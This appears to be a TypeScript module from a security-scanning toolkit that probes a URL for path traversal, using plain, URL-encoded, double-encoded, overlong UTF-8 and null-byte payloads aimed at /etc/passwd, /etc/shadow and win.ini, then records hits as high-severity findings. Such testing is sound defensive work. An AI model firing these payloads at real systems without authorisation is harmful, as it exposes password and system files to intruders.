import type { RunContext } from "../../sdk.js";

/** Standard path traversal payloads with encoding variants. */
const TRAVERSAL_PAYLOADS = {
  plain: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "../../../etc/shadow",
  ],
  singleEncoded: [
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
  ],
  doubleEncoded: [
    "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
    "%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
  ],
  unicode: [
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
  ],
  nullByte: [
    "../../../etc/passwd%00.png",
    "../../../etc/passwd%00.jpg",
  ],
} as const;

/** Indicators that traversal succeeded. */
const SUCCESS_INDICATORS = [
  "root:x:0",          // /etc/passwd
  "root:$",            // /etc/shadow
  "[fonts]",           // win.ini
  "[extensions]",      // win.ini
];

function isTraversalHit(body: string): boolean {
  return SUCCESS_INDICATORS.some((indicator) => body.includes(indicator));
}

/** Test a single URL+payload combo with curl. */
async function testPayload(
  ctx: RunContext,
  baseUrl: string,
  payload: string,
  variant: string,
): Promise<boolean> {
  const url = baseUrl.includes("FUZZ")
    ? baseUrl.replace("FUZZ", payload)
    : `${baseUrl}/${payload}`;

  const result = await ctx.exec("curl", ["-sk", "--max-time", "10", url]);
  if (result.code !== 0) return false;

  if (isTraversalHit(result.stdout)) {
    await ctx.discover("positive", "traversal", `Path traversal via ${variant}: ${url}`);
    await ctx.emit("FindingAdded", {
      title: `Path traversal (${variant})`,
      severity: "high",
      description: `Endpoint ${baseUrl} vulnerable to path traversal using ${variant} encoding. Payload: ${payload}`,
      url,
      payload,
      variant,
    });
    return true;
  }
  return false;
}

/** Test plain traversal sequences: ../ and ..\\ */
export async function testPlainTraversal(ctx: RunContext, baseUrl: string): Promise<boolean> {
  for (const payload of TRAVERSAL_PAYLOADS.plain) {
    if (await testPayload(ctx, baseUrl, payload, "plain")) return true;
  }
  await ctx.discover("negative", "traversal", `Plain traversal failed on ${baseUrl}`);
  return false;
}

/** Test single URL-encoded traversal: %2e%2e%2f */
export async function testSingleEncoded(ctx: RunContext, baseUrl: string): Promise<boolean> {
  for (const payload of TRAVERSAL_PAYLOADS.singleEncoded) {
    if (await testPayload(ctx, baseUrl, payload, "single-encoded")) return true;
  }
  return false;
}

/** Test double URL-encoded traversal: %252e%252e%252f */
export async function testDoubleEncoded(ctx: RunContext, baseUrl: string): Promise<boolean> {
  for (const payload of TRAVERSAL_PAYLOADS.doubleEncoded) {
    if (await testPayload(ctx, baseUrl, payload, "double-encoded")) return true;
  }
  return false;
}

/** Test unicode normalization traversal: overlong UTF-8, fullwidth slash */
export async function testUnicodeTraversal(ctx: RunContext, baseUrl: string): Promise<boolean> {
  for (const payload of TRAVERSAL_PAYLOADS.unicode) {
    if (await testPayload(ctx, baseUrl, payload, "unicode")) return true;
  }
  return false;
}

/** Test null byte injection: %00 before expected extension */
export async function testNullByte(ctx: RunContext, baseUrl: string): Promise<boolean> {
  for (const payload of TRAVERSAL_PAYLOADS.nullByte) {
    if (await testPayload(ctx, baseUrl, payload, "null-byte")) return true;
  }
  return false;
}

/** Run all traversal variants against a URL. Stops at first confirmed hit per variant level. */
export async function pathTraversal(ctx: RunContext, baseUrl: string): Promise<boolean> {
  if (await testPlainTraversal(ctx, baseUrl)) return true;
  if (await testSingleEncoded(ctx, baseUrl)) return true;
  if (await testDoubleEncoded(ctx, baseUrl)) return true;
  if (await testUnicodeTraversal(ctx, baseUrl)) return true;
  if (await testNullByte(ctx, baseUrl)) return true;

  await ctx.discover("negative", "traversal", `All traversal variants failed on ${baseUrl}`);
  return false;
}
